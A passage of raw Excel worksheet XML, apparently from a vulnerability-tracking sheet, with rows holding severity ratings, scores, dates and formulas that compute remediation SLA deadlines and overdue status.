      <c r="Q538" t="s">
        <v>1996</v>
      </c>
      <c r="T538" s="1">
        <v>45992</v>
      </c>
      <c r="U538" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>217</v>
      </c>
      <c r="V538" s="1">
        <f t="shared" ref="V538:V601" si="31">IF(M538="Critical",T538+10,IF(M538="High",T538+30,IF(M538="Bad",T538+30,IF(M538="Medium",T538+90,IF(M538="Warm",T538+90,IF(M538="Low",T538+120,IF(M538="Fair",T538+120,IF(M538="Neutral",T538+120,""))))))))</f>
        <v>46082</v>
      </c>
      <c r="W538" s="76" t="str">
        <f t="shared" ref="W538:W601" ca="1" si="32">IF(M538="Critical",IF(U538&gt;10,"SLA Vencido","En SLA"),IF(M538="High",IF(U538&gt;30,"SLA Vencido","En SLA"),IF(M538="Bad",IF(U538&gt;30,"SLA Vencido","En SLA"),IF(M538="Medium",IF(U538&gt;90,"SLA Vencido","En SLA"),IF(M538="Warm",IF(U538&gt;90,"SLA Vencido","En SLA"),IF(M538="Low",IF(U538&gt;120,"SLA Vencido","En SLA"),IF(M538="Fair",IF(U538&gt;120,"SLA Vencido","En SLA"),IF(M538="Neutral",IF(U538&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB538" s="65" t="s">
        <v>1997</v>
      </c>
      <c r="AC538" s="65" t="s">
        <v>1998</v>
      </c>
      <c r="AD538" s="65" t="s">
        <v>1999</v>
      </c>
      <c r="AE538" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG538" s="65" t="s">
        <v>1092</v>
      </c>
      <c r="AH538" t="str">
        <f>IFERROR(VLOOKUP(H538,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="539" spans="1:34" ht="145" hidden="1" x14ac:dyDescent="0.35">
      <c r="A539" s="50">
        <v>538</v>
      </c>
      <c r="B539" t="s">
        <v>32</v>
      </c>
      <c r="C539" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D539" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G539" s="60" t="s">
        <v>2000</v>
      </c>
      <c r="H539" t="s">
        <v>2001</v>
      </c>
      <c r="I539" t="s">
        <v>2002</v>
      </c>
      <c r="J539" t="s">
        <v>2003</v>
      </c>
      <c r="L539" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M539" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N539">
        <v>3</v>
      </c>
      <c r="Q539" s="87" t="s">
        <v>2004</v>
      </c>
      <c r="T539" s="1">
        <v>46013</v>
      </c>
      <c r="U539" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>196</v>
      </c>
      <c r="V539" s="1">
        <f t="shared" si="31"/>
        <v>46103</v>
      </c>
      <c r="W539" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB539" s="65" t="s">
        <v>2005</v>
      </c>
      <c r="AC539" s="65" t="s">
        <v>2006</v>
      </c>
      <c r="AD539" s="65" t="s">
        <v>2007</v>
      </c>
      <c r="AE539" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG539" s="65" t="s">
        <v>2008</v>
      </c>
      <c r="AH539" t="str">
        <f>IFERROR(VLOOKUP(H539,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="540" spans="1:34" ht="174" hidden="1" x14ac:dyDescent="0.35">
      <c r="A540" s="50">
        <v>539</v>
      </c>
      <c r="B540" t="s">
        <v>32</v>
      </c>
      <c r="C540" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D540" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G540" s="60" t="s">
        <v>2000</v>
      </c>
      <c r="I540" t="s">
        <v>2009</v>
      </c>
      <c r="J540" t="s">
        <v>2010</v>
      </c>
      <c r="L540" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M540" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N540">
        <v>4.3</v>
      </c>
      <c r="Q540" s="87" t="s">
        <v>2011</v>
      </c>
      <c r="T540" s="1">
        <v>46013</v>
      </c>
      <c r="U540" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>196</v>
      </c>
      <c r="V540" s="1">
        <f t="shared" si="31"/>
        <v>46103</v>
      </c>
      <c r="W540" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB540" s="65" t="s">
        <v>2012</v>
      </c>
      <c r="AC540" s="65" t="s">
        <v>2013</v>
      </c>
      <c r="AD540" s="65" t="s">
        <v>2014</v>
      </c>
      <c r="AE540" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG540" s="65" t="s">
        <v>2008</v>
      </c>
      <c r="AH540" t="str">
        <f>IFERROR(VLOOKUP(H540,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="541" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A541">
        <v>540</v>
      </c>
      <c r="B541" t="s">
        <v>32</v>
      </c>
      <c r="C541" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D541" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G541" t="s">
        <v>2015</v>
      </c>
      <c r="H541" t="s">
        <v>2016</v>
      </c>
      <c r="I541" t="s">
        <v>2017</v>
      </c>
      <c r="J541" t="s">
        <v>2018</v>
      </c>
      <c r="L541" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M541" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N541">
        <v>9.1</v>
      </c>
      <c r="Q541" s="87" t="s">
        <v>2019</v>
      </c>
      <c r="T541" s="1">
        <v>46020</v>
      </c>
      <c r="U541" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>189</v>
      </c>
      <c r="V541" s="1">
        <f t="shared" si="31"/>
        <v>46030</v>
      </c>
      <c r="W541" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB541" s="65" t="s">
        <v>2020</v>
      </c>
      <c r="AC541" s="65" t="s">
        <v>2021</v>
      </c>
      <c r="AD541" s="65" t="s">
        <v>2022</v>
      </c>
      <c r="AE541" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG541" s="65" t="s">
        <v>2023</v>
      </c>
      <c r="AH541" t="str">
        <f>IFERROR(VLOOKUP(H541,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="542" spans="1:34" ht="145" hidden="1" x14ac:dyDescent="0.35">
      <c r="A542">
        <v>541</v>
      </c>
      <c r="B542" t="s">
        <v>32</v>
      </c>
      <c r="C542" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D542" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G542" t="s">
        <v>2015</v>
      </c>
      <c r="H542" t="s">
        <v>2024</v>
      </c>
      <c r="I542" t="s">
        <v>2025</v>
      </c>
      <c r="J542" t="s">
        <v>2026</v>
      </c>
      <c r="L542" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M542" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N542">
        <v>7.5</v>
      </c>
      <c r="Q542" s="87" t="s">
        <v>2027</v>
      </c>
      <c r="T542" s="1">
        <v>46020</v>
      </c>
      <c r="U542" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>189</v>
      </c>
      <c r="V542" s="1">
        <f t="shared" si="31"/>
        <v>46050</v>
      </c>
      <c r="W542" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB542" s="65" t="s">
        <v>2028</v>
      </c>
      <c r="AC542" s="65" t="s">
        <v>2029</v>
      </c>
      <c r="AD542" s="65" t="s">
        <v>2030</v>
      </c>
      <c r="AE542" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG542" s="65" t="s">
        <v>2023</v>
      </c>
      <c r="AH542" t="str">
        <f>IFERROR(VLOOKUP(H542,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="543" spans="1:34" ht="409.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A543" s="84">
        <v>542</v>
      </c>
      <c r="B543" t="s">
        <v>32</v>
      </c>
      <c r="C543" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D543" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G543" t="s">
        <v>2015</v>
      </c>
      <c r="H543" t="s">
        <v>2031</v>
      </c>
      <c r="J543" t="s">
        <v>2032</v>
      </c>
      <c r="L543" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M543" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N543">
        <v>6.6</v>
      </c>
      <c r="Q543" t="s">
        <v>2033</v>
      </c>
      <c r="T543" s="1">
        <v>46024</v>
      </c>
      <c r="U543" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>185</v>
      </c>
      <c r="V543" s="1">
        <f t="shared" si="31"/>
        <v>46114</v>
      </c>
      <c r="W543" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB543" s="65" t="s">
        <v>2034</v>
      </c>
      <c r="AC543" s="65" t="s">
        <v>2035</v>
      </c>
      <c r="AE543" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG543" s="65" t="s">
        <v>2023</v>
      </c>
      <c r="AH543" t="str">
        <f>IFERROR(VLOOKUP(H543,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="544" spans="1:34" ht="409.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A544" s="84">
        <v>543</v>
      </c>
      <c r="B544" t="s">
        <v>32</v>
      </c>
      <c r="C544" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D544" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G544" t="s">
        <v>2015</v>
      </c>
      <c r="H544" t="s">
        <v>2036</v>
      </c>
      <c r="J544" t="s">
        <v>2026</v>
      </c>
      <c r="L544" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M544" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N544">
        <v>5.3</v>
      </c>
      <c r="Q544" t="s">
        <v>2033</v>
      </c>
      <c r="T544" s="1">
        <v>46024</v>
      </c>
      <c r="U544" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>185</v>
      </c>
      <c r="V544" s="1">
        <f t="shared" si="31"/>
        <v>46114</v>
      </c>
      <c r="W544" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB544" s="65" t="s">
        <v>2037</v>
      </c>
      <c r="AC544" s="65" t="s">
        <v>2038</v>
      </c>
      <c r="AE544" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG544" s="65" t="s">
        <v>2023</v>
      </c>
      <c r="AH544" t="str">
        <f>IFERROR(VLOOKUP(H544,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="545" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A545" s="84">
        <v>544</v>
      </c>
      <c r="B545" t="s">
        <v>32</v>
      </c>
      <c r="C545" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D545" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G545" t="s">
        <v>2015</v>
      </c>
      <c r="H545" t="s">
        <v>2039</v>
      </c>
      <c r="J545" t="s">
        <v>2040</v>
      </c>
      <c r="L545" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M545" s="50" t="s">
        <v>61</v>
      </c>
      <c r="T545" s="1">
        <v>46024</v>
      </c>
      <c r="U545" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>185</v>
      </c>
      <c r="V545" s="1">
        <f t="shared" si="31"/>
        <v>46114</v>
      </c>
      <c r="W545" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB545" t="s">
        <v>2041</v>
      </c>
      <c r="AC545" t="s">
        <v>2042</v>
      </c>
      <c r="AE545" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH545" t="str">
        <f>IFERROR(VLOOKUP(H545,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="546" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A546" s="84">
        <v>545</v>
      </c>
      <c r="B546" t="s">
        <v>32</v>
      </c>
      <c r="C546" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D546" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G546" t="s">
        <v>3454</v>
      </c>
      <c r="H546" t="s">
        <v>3464</v>
      </c>
      <c r="I546" t="s">
        <v>3455</v>
      </c>
      <c r="J546" t="s">
        <v>3457</v>
      </c>
      <c r="L546" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M546" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N546">
        <v>5.4</v>
      </c>
      <c r="Q546" t="s">
        <v>1313</v>
      </c>
      <c r="T546" s="1">
        <v>46062</v>
      </c>
      <c r="U546" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>147</v>
      </c>
      <c r="V546" s="1">
        <f t="shared" si="31"/>
        <v>46152</v>
      </c>
      <c r="W546" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB546" s="65" t="s">
        <v>3458</v>
      </c>
      <c r="AC546" s="65" t="s">
        <v>3459</v>
      </c>
      <c r="AD546" s="65" t="s">
        <v>3460</v>
      </c>
      <c r="AE546" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG546" s="65" t="s">
        <v>3462</v>
      </c>
      <c r="AH546" t="str">
        <f>IFERROR(VLOOKUP(H546,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="547" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A547" s="84">
        <v>546</v>
      </c>
      <c r="B547" t="s">
        <v>32</v>
      </c>
      <c r="C547" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D547" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G547" t="s">
        <v>3454</v>
      </c>
      <c r="H547" t="s">
        <v>3465</v>
      </c>
      <c r="I547" t="s">
        <v>3456</v>
      </c>
      <c r="J547" t="s">
        <v>80</v>
      </c>
      <c r="L547" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M547" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N547">
        <v>4.4000000000000004</v>
      </c>
      <c r="Q547" t="s">
        <v>1313</v>
      </c>
      <c r="T547" s="1">
        <v>46062</v>
      </c>
      <c r="U547" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>147</v>
      </c>
      <c r="V547" s="1">
        <f t="shared" si="31"/>
        <v>46152</v>
      </c>
      <c r="W547" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB547" s="65" t="s">
        <v>3461</v>
      </c>
      <c r="AC547" s="65" t="s">
        <v>1992</v>
      </c>
      <c r="AD547" s="65" t="s">
        <v>1993</v>
      </c>
      <c r="AE547" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG547" s="65" t="s">
        <v>3462</v>
      </c>
      <c r="AH547" t="str">
        <f>IFERROR(VLOOKUP(H547,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="548" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A548" s="84">
        <v>547</v>
      </c>
      <c r="B548" t="s">
        <v>32</v>
      </c>
      <c r="C548" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D548" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G548" t="s">
        <v>1323</v>
      </c>
      <c r="H548" t="s">
        <v>3466</v>
      </c>
      <c r="J548" t="s">
        <v>1844</v>
      </c>
      <c r="L548" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M548" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N548">
        <v>7.3</v>
      </c>
      <c r="Q548" t="s">
        <v>3474</v>
      </c>
      <c r="T548" s="1">
        <v>46062</v>
      </c>
      <c r="U548" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>147</v>
      </c>
      <c r="V548" s="1">
        <f t="shared" si="31"/>
        <v>46092</v>
      </c>
      <c r="W548" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB548" t="s">
        <v>3477</v>
      </c>
      <c r="AD548" t="s">
        <v>3479</v>
      </c>
      <c r="AE548" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG548" s="65" t="s">
        <v>969</v>
      </c>
      <c r="AH548" t="str">
        <f>IFERROR(VLOOKUP(H548,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="549" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A549" s="84">
        <v>548</v>
      </c>
      <c r="B549" t="s">
        <v>32</v>
      </c>
      <c r="C549" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D549" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G549" t="s">
        <v>1323</v>
      </c>
      <c r="H549" t="s">
        <v>3467</v>
      </c>
      <c r="J549" t="s">
        <v>1844</v>
      </c>
      <c r="L549" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M549" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N549">
        <v>7.3</v>
      </c>
      <c r="Q549" t="s">
        <v>3475</v>
      </c>
      <c r="T549" s="1">
        <v>46062</v>
      </c>
      <c r="U549" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>147</v>
      </c>
      <c r="V549" s="1">
        <f t="shared" si="31"/>
        <v>46092</v>
      </c>
      <c r="W549" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB549" t="s">
        <v>3477</v>
      </c>
      <c r="AD549" t="s">
        <v>3479</v>
      </c>
      <c r="AE549" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG549" s="65" t="s">
        <v>969</v>
      </c>
      <c r="AH549" t="str">
        <f>IFERROR(VLOOKUP(H549,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="550" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A550" s="84">
        <v>549</v>
      </c>
      <c r="B550" t="s">
        <v>32</v>
      </c>
      <c r="C550" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D550" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G550" t="s">
        <v>1323</v>
      </c>
      <c r="H550" t="s">
        <v>3468</v>
      </c>
      <c r="J550" t="s">
        <v>3473</v>
      </c>
      <c r="L550" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M550" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N550">
        <v>7.3</v>
      </c>
      <c r="Q550" t="s">
        <v>3476</v>
      </c>
      <c r="T550" s="1">
        <v>46062</v>
      </c>
      <c r="U550" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>147</v>
      </c>
      <c r="V550" s="1">
        <f t="shared" si="31"/>
        <v>46092</v>
      </c>
      <c r="W550" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB550" t="s">
        <v>3478</v>
      </c>
      <c r="AD550" t="s">
        <v>3479</v>
      </c>
      <c r="AE550" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG550" s="65" t="s">
        <v>969</v>
      </c>
      <c r="AH550" t="str">
        <f>IFERROR(VLOOKUP(H550,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="551" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A551" s="84">
        <v>550</v>
      </c>
      <c r="B551" t="s">
        <v>32</v>
      </c>
      <c r="C551" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D551" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G551" t="s">
        <v>1323</v>
      </c>
      <c r="H551" t="s">
        <v>3469</v>
      </c>
      <c r="J551" t="s">
        <v>3473</v>
      </c>
      <c r="L551" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M551" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N551">
        <v>7.3</v>
      </c>
      <c r="Q551" t="s">
        <v>3474</v>
      </c>
      <c r="T551" s="1">
        <v>46062</v>
      </c>
      <c r="U551" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>147</v>
      </c>
      <c r="V551" s="1">
        <f t="shared" si="31"/>
        <v>46092</v>
      </c>
      <c r="W551" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB551" t="s">
        <v>3478</v>
      </c>
      <c r="AD551" t="s">
        <v>3479</v>
      </c>
      <c r="AE551" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG551" s="65" t="s">
        <v>969</v>
      </c>
      <c r="AH551" t="str">
        <f>IFERROR(VLOOKUP(H551,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="552" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A552" s="84">
        <v>551</v>
      </c>
      <c r="B552" t="s">
        <v>32</v>
      </c>
      <c r="C552" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D552" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G552" t="s">
        <v>1323</v>
      </c>
      <c r="H552" t="s">
        <v>3470</v>
      </c>
      <c r="J552" t="s">
        <v>3473</v>
      </c>
      <c r="L552" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M552" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N552">
        <v>7.3</v>
      </c>
      <c r="Q552" t="s">
        <v>1856</v>
      </c>
      <c r="T552" s="1">
        <v>46062</v>
      </c>
      <c r="U552" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>147</v>
      </c>
      <c r="V552" s="1">
        <f t="shared" si="31"/>
        <v>46092</v>
      </c>
      <c r="W552" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB552" t="s">
        <v>3478</v>
      </c>
      <c r="AD552" t="s">
        <v>3479</v>
      </c>
      <c r="AE552" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG552" s="65" t="s">
        <v>969</v>
      </c>
      <c r="AH552" t="str">
        <f>IFERROR(VLOOKUP(H552,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="553" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A553" s="84">
        <v>552</v>
      </c>
      <c r="B553" t="s">
        <v>32</v>
      </c>
      <c r="C553" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D553" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G553" t="s">
        <v>1323</v>
      </c>
      <c r="H553" t="s">
        <v>3471</v>
      </c>
      <c r="J553" t="s">
        <v>3473</v>
      </c>
      <c r="L553" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M553" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N553">
        <v>7.3</v>
      </c>
      <c r="Q553" t="s">
        <v>3475</v>
      </c>
      <c r="T553" s="1">
        <v>46062</v>
      </c>
      <c r="U553" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>147</v>
      </c>
      <c r="V553" s="1">
        <f t="shared" si="31"/>
        <v>46092</v>
      </c>
      <c r="W553" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB553" t="s">
        <v>3478</v>
      </c>
      <c r="AD553" t="s">
        <v>3479</v>
      </c>
      <c r="AE553" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG553" s="65" t="s">
        <v>969</v>
      </c>
      <c r="AH553" t="str">
        <f>IFERROR(VLOOKUP(H553,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="554" spans="1:34" hidden="1" x14ac:dyDescent="0.35">
      <c r="A554" s="84">
        <v>553</v>
      </c>
      <c r="B554" t="s">
        <v>32</v>
      </c>
      <c r="C554" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D554" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G554" t="s">
        <v>1323</v>
      </c>
      <c r="H554" t="s">
        <v>3472</v>
      </c>
      <c r="J554" t="s">
        <v>3473</v>
      </c>
      <c r="L554" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M554" s="50" t="s">
        <v>522</v>
      </c>
      <c r="N554">
        <v>7.3</v>
      </c>
      <c r="Q554" t="s">
        <v>1853</v>
      </c>
      <c r="T554" s="1">
        <v>46062</v>
      </c>
      <c r="U554" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>147</v>
      </c>
      <c r="V554" s="1">
        <f t="shared" si="31"/>
        <v>46092</v>
      </c>
      <c r="W554" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB554" t="s">
        <v>3478</v>
      </c>
      <c r="AD554" t="s">
        <v>3479</v>
      </c>
      <c r="AE554" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AG554" s="65" t="s">
        <v>969</v>
      </c>
      <c r="AH554" t="str">
        <f>IFERROR(VLOOKUP(H554,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="555" spans="1:34" ht="130.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A555" s="84">
        <v>554</v>
      </c>
      <c r="B555" t="s">
        <v>32</v>
      </c>
      <c r="C555" s="84" t="s">
        <v>225</v>
      </c>
      <c r="D555" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G555" t="s">
        <v>3519</v>
      </c>
      <c r="I555" t="s">
        <v>3520</v>
      </c>
      <c r="J555" t="s">
        <v>3529</v>
      </c>
      <c r="L555" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M555" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N555">
        <v>6.5</v>
      </c>
      <c r="Q555" t="s">
        <v>3530</v>
      </c>
      <c r="T555" s="1">
        <v>46094</v>
      </c>
      <c r="U555" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>115</v>
      </c>
      <c r="V555" s="1">
        <f t="shared" si="31"/>
        <v>46184</v>
      </c>
      <c r="W555" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB555" s="65" t="s">
        <v>3531</v>
      </c>
      <c r="AC555" s="65" t="s">
        <v>3533</v>
      </c>
      <c r="AD555" s="65" t="s">
        <v>3532</v>
      </c>
      <c r="AE555" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH555" t="str">
        <f>IFERROR(VLOOKUP(H555,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="556" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A556" s="84">
        <v>555</v>
      </c>
      <c r="B556" t="s">
        <v>32</v>
      </c>
      <c r="C556" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D556" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G556" t="s">
        <v>3519</v>
      </c>
      <c r="I556" t="s">
        <v>3521</v>
      </c>
      <c r="J556" t="s">
        <v>1271</v>
      </c>
      <c r="L556" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M556" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N556">
        <v>3.8</v>
      </c>
      <c r="Q556" t="s">
        <v>3534</v>
      </c>
      <c r="T556" s="1">
        <v>46094</v>
      </c>
      <c r="U556" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>115</v>
      </c>
      <c r="V556" s="1">
        <f t="shared" si="31"/>
        <v>46214</v>
      </c>
      <c r="W556" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>En SLA</v>
      </c>
      <c r="AB556" s="65" t="s">
        <v>3077</v>
      </c>
      <c r="AC556" s="65" t="s">
        <v>3539</v>
      </c>
      <c r="AD556" s="65" t="s">
        <v>3538</v>
      </c>
      <c r="AE556" s="65" t="s">
        <v>1987</v>
      </c>
      <c r="AH556" t="str">
        <f>IFERROR(VLOOKUP(H556,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="557" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A557" s="84">
        <v>556</v>
      </c>
      <c r="B557" t="s">
        <v>32</v>
      </c>
      <c r="C557" s="84" t="s">
        <v>33</v>
      </c>
      <c r="D557" s="84" t="s">
        <v>34</v>
      </c>
      <c r="G557" t="s">
        <v>3519</v>
      </c>
      <c r="I557" t="s">
        <v>3522</v>
      </c>
      <c r="J557" t="s">
        <v>1271</v>
      </c>
      <c r="L557" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M557" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N557">
        <v>3.8</v>
      </c>
      <c r="Q557" t="s">
        <v>3535</v>
      </c>
      <c r="T557" s="1">
        <v>46094</v>
      </c>
      <c r="U557" s="76">
        <f t="shared" ca="1" si="30"/>
        <v>115</v>
      </c>
      <c r="V557" s="1">
        <f t="shared" si="31"/>
        <v>46214</v>
      </c>
      <c r="W557" s="76" t="str">
        <f t="shared" ca="1" si="32"/>
        <v>En SLA</v>
      </c>
      <c r="AB557" s="65" t="s">
        <v>3077</v>
      </c>
      <c r="AC557" s="65" t="s">
        <v>3539</v>
      </c>
